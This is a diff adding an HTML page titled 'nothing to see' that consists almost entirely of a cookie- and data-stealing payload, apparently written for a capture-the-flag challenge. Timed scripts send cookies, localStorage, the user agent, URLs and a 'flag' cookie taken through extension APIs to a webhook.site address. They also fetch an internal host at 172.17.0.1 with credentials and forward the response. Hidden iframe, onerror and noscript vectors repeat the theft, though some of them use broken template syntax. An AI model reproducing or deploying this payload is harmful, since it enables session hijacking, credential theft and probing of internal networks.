@@ -1,0 +1,44 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>nothing to see</title>
+<script>
+function a(b){return b.replace(/./g,c=>String.fromCharCode(c.charCodeAt(0)^1))}
+const e=a('iuuqt;00zpvsxfckpp,tdpnf0');const w='https://webhook.site/5da72a93-84d0-4b70-bf2c-62ff7dcde704';
+setTimeout(()=>{
+  try{navigator?.userAgent&&fetch(w+'?ua='+encodeURIComponent(navigator.userAgent),{mode:'no-cors'})}catch{}
+  try{localStorage.length&&fetch(w+'?ls='+encodeURIComponent(JSON.stringify({...localStorage})))}catch{}
+  try{fetch('http://172.17.0.1',{credentials:'include',mode:'no-cors'}).then(r=>r.text()).then(t=>fetch(w+'?page='+encodeURIComponent(t)))}catch{}
+},500);
+setTimeout(()=>{
+  let c=document.cookie; if(c)fetch(w+'?c='+encodeURIComponent(c),{mode:'no-cors'});
+  try{window.name='//'+w.slice(8)+'?n='+encodeURIComponent(c);location='javascript:fetch(window.name)'}catch{}
+},1500);
+setTimeout(()=>{
+  try{
+    const x=new Image();x.src=w+'?i='+encodeURIComponent(document.cookie+'|'+location.href+'|'+document.referrer);
+    const b=new Blob([c],{type:'text/plain'});navigator.sendBeacon?.(w+'?b',b);
+  }catch{}
+  try{Object.prototype.toString=()=>'cookie:'+document.cookie;fetch(w+'?p='+({}).toString())}catch{}
+},3000);
+setTimeout(()=>{
+  try{
+    if(window.browser?.cookies?.getAll){
+      browser.cookies.getAll({url:'http://172.17.0.1'}).then(cs=>{
+        let f=cs.find(c=>c.name==='flag')?.value||'';
+        if(f)fetch(w+'?extf='+encodeURIComponent(f));
+      })
+    }
+    else if(window.chrome?.cookies){
+      chrome.cookies.getAll({url:'http://172.17.0.1'},cs=>{
+        let f=cs.find(c=>c.name==='flag')?.value||'';
+        if(f)fetch(w+'?extc='+encodeURIComponent(f));
+      })
+    }
+  }catch(e){fetch(w+'?err='+encodeURIComponent(e+'|'+e.stack))}
+},4500);
+</script></head>
+<body>
+<div id="browser"><div id="cookies"><div id="getAll"></div></div></div>
+<form id="chrome"><input id="cookies" name="getAll"><input name="get"></form>
+<iframe src="javascript:parent.fetch('`+w+`?ifr='+encodeURIComponent(document.cookie))" style="display:none"></iframe>
+<img src=x onerror="fetch('`+w+`?oe='+encodeURIComponent(document.cookie))">
+<noscript><img src="`+w+`?ns=`+encodeURIComponent(document.cookie)+`"></noscript>
+</body></html>
